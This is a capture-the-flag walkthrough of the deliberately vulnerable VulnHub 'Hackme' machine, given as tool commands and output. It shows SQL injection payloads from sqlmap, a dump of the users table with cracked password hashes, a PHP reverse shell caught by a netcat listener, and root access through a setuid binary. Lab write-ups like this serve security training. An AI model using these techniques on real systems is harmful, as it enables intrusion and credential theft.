# Hackme | VulnHub
https://www.vulnhub.com/entry/hackme-1,330/

### 1. Scan
```bash
┌──(kali㉿kali)-[~]
└─$ sudo nmap -A -p- -T4 192.168.34.147                                                                                                                                             1 ⨯
Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-09 03:07 EST
Nmap scan report for 192.168.34.147
Host is up (0.0012s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.7p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 6b:a8:24:d6:09:2f:c9:9a:8e:ab:bc:6e:7d:4e:b9:ad (RSA)
|   256 ab:e8:4f:53:38:06:2c:6a:f3:92:e3:97:4a:0e:3e:d1 (ECDSA)
|_  256 32:76:90:b8:7d:fc:a4:32:63:10:cd:67:61:49:d6:c4 (ED25519)
80/tcp open  http    Apache httpd 2.4.34 ((Ubuntu))
|_http-server-header: Apache/2.4.34 (Ubuntu)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
MAC Address: 00:0C:29:71:FB:54 (VMware)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   1.23 ms 192.168.34.147

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.84 seconds
```
The machine is running an Apache HTTP server.

### 2. Enumeration
The website has a simple login form, and a page to create an account. There does not appear to be anything in the source. I can create an account and sign in. Once logged in, the user can search a database of books.
  
Trying different inputs into this field does not result in any actual response, as the database is currently empty. However a blind attack might still be possible.
```bash
┌──(kali㉿kali)-[~/Extra_Tools/dirsearch]
└─$ sqlmap -r ~/Desktop/search.request --batch
        ___
       __H__
 ___ ___[,]_____ ___ ___  {1.4.12#stable}
|_ -| . [(]     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 03:38:53 /2021-03-09/

[03:38:53] [INFO] parsing HTTP request from '/home/kali/Desktop/search.request'
[03:38:53] [INFO] testing connection to the target URL
[03:38:53] [INFO] checking if the target is protected by some kind of WAF/IPS
[03:38:53] [INFO] testing if the target URL content is stable
[03:38:54] [INFO] target URL content is stable
[03:38:54] [INFO] testing if POST parameter 'search' is dynamic
[03:38:54] [WARNING] POST parameter 'search' does not appear to be dynamic
[03:38:54] [WARNING] heuristic (basic) test shows that POST parameter 'search' might not be injectable
[03:38:54] [INFO] testing for SQL injection on POST parameter 'search'
[03:38:54] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[03:38:54] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[03:38:54] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[03:38:54] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[03:38:54] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
[03:38:54] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
[03:38:54] [INFO] testing 'MySQL >= 5.0 error-based - Parameter replace (FLOOR)'
[03:38:54] [INFO] testing 'Generic inline queries'
[03:38:54] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
[03:38:54] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
[03:38:54] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
[03:38:54] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[03:39:04] [INFO] POST parameter 'search' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] Y
[03:39:04] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[03:39:04] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[03:39:05] [INFO] target URL appears to be UNION injectable with 3 columns
[03:39:05] [INFO] POST parameter 'search' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
POST parameter 'search' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 69 HTTP(s) requests:
---
Parameter: search (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: search=test' AND (SELECT 9108 FROM (SELECT(SLEEP(5)))CvWy) AND 'ucnW'='ucnW

    Type: UNION query
    Title: Generic UNION query (NULL) - 3 columns
    Payload: search=test' UNION ALL SELECT CONCAT(0x71707a7871,0x654b487272756e76426842547870637064656d676f4478746c764c506b524a674a4d6c5678427a53,0x71786a7a71),NULL,NULL-- -
---
[03:39:05] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.0.12
[03:39:05] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/192.168.34.147'

[*] ending @ 03:39:05 /2021-03-09/
```
There is indeed a time-based blind injection vulnerability in the web application. From here it is a matter of drilling into the databases and tables to find the users table and then dumping it out.
```bash
┌──(kali㉿kali)-[~/Extra_Tools/dirsearch]
└─$ sqlmap -r ~/Desktop/search.request --batch -D webapphacking -T users --dump
        ___
       __H__                                                                                                                                                                            
 ___ ___[.]_____ ___ ___  {1.4.12#stable}                                                                                                                                               
|_ -| . [(]     | .'| . |                                                                                                                                                               
|___|_  [']_|_|_|__,|  _|                                                                                                                                                               
      |_|V...       |_|   http://sqlmap.org                                                                                                                                             

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 03:45:26 /2021-03-09/

[03:45:26] [INFO] parsing HTTP request from '/home/kali/Desktop/search.request'
[03:45:26] [INFO] resuming back-end DBMS 'mysql' 
[03:45:26] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: search (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: search=test' AND (SELECT 9108 FROM (SELECT(SLEEP(5)))CvWy) AND 'ucnW'='ucnW

    Type: UNION query
    Title: Generic UNION query (NULL) - 3 columns
    Payload: search=test' UNION ALL SELECT CONCAT(0x71707a7871,0x654b487272756e76426842547870637064656d676f4478746c764c506b524a674a4d6c5678427a53,0x71786a7a71),NULL,NULL-- -
---
[03:45:26] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.0.12
[03:45:26] [INFO] fetching columns for table 'users' in database 'webapphacking'
[03:45:26] [INFO] fetching entries for table 'users' in database 'webapphacking'
[03:45:26] [INFO] recognized possible password hashes in column 'pasword'
do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] N
do you want to crack them via a dictionary-based attack? [Y/n/q] Y
[03:45:26] [INFO] using hash method 'md5_generic_passwd'
what dictionary do you want to use?
[1] default dictionary file '/usr/share/sqlmap/data/txt/wordlist.tx_' (press Enter)
[2] custom dictionary file
[3] file with list of dictionary files
> 1
[03:45:26] [INFO] using default dictionary
do you want to use common password suffixes? (slow!) [y/N] N
[03:45:26] [INFO] starting dictionary-based cracking (md5_generic_passwd)
[03:45:26] [INFO] starting 4 processes 
[03:45:30] [INFO] cracked password 'commando' for hash '6269c4f71a55b24bad0f0267d9be5508'                                                                                              
[03:45:32] [INFO] cracked password 'hello' for hash '5d41402abc4b2a76b9719d911017c592'                                                                                                 
[03:45:34] [INFO] cracked password 'lollol' for hash 'e7af287f7c896a07485ff47fed078512'                                                                                                
[03:45:36] [INFO] cracked password 'p@ssw0rd' for hash '0f359740bd1cda994f8b55330c86d845'                                                                                              
[03:45:38] [INFO] cracked password 'testtest' for hash '05a671c66aefea124cc08b76ea6d30bb'                                                                                              
Database: webapphacking                                                                                                                                                                
Table: users
[7 entries]
+----+--------------+------------+----------------+---------------------------------------------+
| id | name         | user       | address        | pasword                                     |
+----+--------------+------------+----------------+---------------------------------------------+
| 1  | David        | user1      | Newton Circles | 5d41402abc4b2a76b9719d911017c592 (hello)    |
| 2  | Beckham      | user2      | Kensington     | 6269c4f71a55b24bad0f0267d9be5508 (commando) |
| 3  | anonymous    | user3      | anonymous      | 0f359740bd1cda994f8b55330c86d845 (p@ssw0rd) |
| 10 | testismyname | test       | testaddress    | 05a671c66aefea124cc08b76ea6d30bb (testtest) |
| 11 | superadmin   | superadmin | superadmin     | 2386acb2cf356944177746fc92523983            |
| 12 | test1        | test1      | test1          | 05a671c66aefea124cc08b76ea6d30bb (testtest) |
| 13 | Jack         | jib1337    | 123lolst       | e7af287f7c896a07485ff47fed078512 (lollol)   |
+----+--------------+------------+----------------+---------------------------------------------+

[03:45:41] [INFO] table 'webapphacking.users' dumped to CSV file '/home/kali/.local/share/sqlmap/output/192.168.34.147/dump/webapphacking/users.csv'
[03:45:41] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/192.168.34.147'

[*] ending @ 03:45:41 /2021-03-09/

```
Although the "superadmin" password is not able to be found by sqlmap, using some web-based tools reveals that credential set to be `superadmin:Uncrackable`.
  
### 3. Access admin account
From the superadmin's account, the user can upload images. When a user uploads something, it goes to the /uploads/ directory on the machine. After a few tests, it turns out you can upload any type of file. With this knowledge, in combination with the fact that it is a php server, I can upload a php reverse shell and access the machine internally.

### 4. Get a shell
Upload a php reverse shell, start a listener and then access the file.
```bash
┌──(kali㉿kali)-[~/Desktop]
└─$ nc -lvnp 9999           
listening on [any] 9999 ...
connect to [192.168.34.141] from (UNKNOWN) [192.168.34.147] 40994
Linux hackme 4.18.0-16-generic #17-Ubuntu SMP Fri Feb 8 00:06:57 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
 09:08:30 up  1:02,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ 
```

### 5. Enumerate from user
Check what other users there are:
```bash
www-data@hackme:/var/www/html$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
syslog:x:103:108::/home/syslog:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
messagebus:x:105:109::/nonexistent:/usr/sbin/nologin
uuidd:x:106:111::/run/uuidd:/usr/sbin/nologin
landscape:x:107:113::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:108:1::/var/cache/pollinate:/bin/false
sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:998:998:systemd Core Dumper:/:/sbin/nologin
hackme:x:1000:1000:hackme:/home/hackme:/bin/bash
lxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false
mysql:x:110:115:MySQL Server,,,:/nonexistent:/bin/false
```
There is a hackme user in addition to the root user. However, when looking in /home, there is also a folder for a "legacy" user. This user's folder has a setuid binary owned by root, but executable by others.
```bash
www-data@hackme:/var/www/html$ cd /home
www-data@hackme:/home$ ls
hackme  legacy
www-data@hackme:/home$ ls -la legacy
total 20
drwxr-xr-x 2 root root 4096 Mar 26  2019 .
drwxr-xr-x 4 root root 4096 Mar 26  2019 ..
-rwsr--r-x 1 root root 8472 Mar 26  2019 touchmenot
www-data@hackme:/home$ file legacy/touchmenot
legacy/touchmenot: setuid ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=3ff194cb73ad46fb725445a4a8992494e7110a1c, not stripped
```

### 6. Escalate to root.
Run the binary to become the root user.
```bash
www-data@hackme:/home/legacy$ ./touchmenot
root@hackme:/home/legacy# id
uid=0(root) gid=33(www-data) groups=33(www-data)
root@hackme:/home/legacy# whoami
root
```